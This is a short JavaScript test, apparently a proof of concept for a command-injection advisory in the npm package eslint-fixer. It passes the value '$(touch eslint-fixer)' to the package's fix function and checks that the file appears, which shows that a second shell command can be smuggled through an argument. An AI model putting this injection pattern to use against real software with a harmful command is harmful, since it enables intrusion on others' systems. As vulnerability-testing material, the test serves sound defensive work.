// https://snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392
test("Command Injection in eslint-fixer", () => {
  const fix = require("eslint-fixer");
  const fs = require("fs");
  const path = "./eslint-fixer";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  fix("$(touch eslint-fixer)").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, () => {}); // deleting the file
  }); // creating the file as a proof of exploit
});
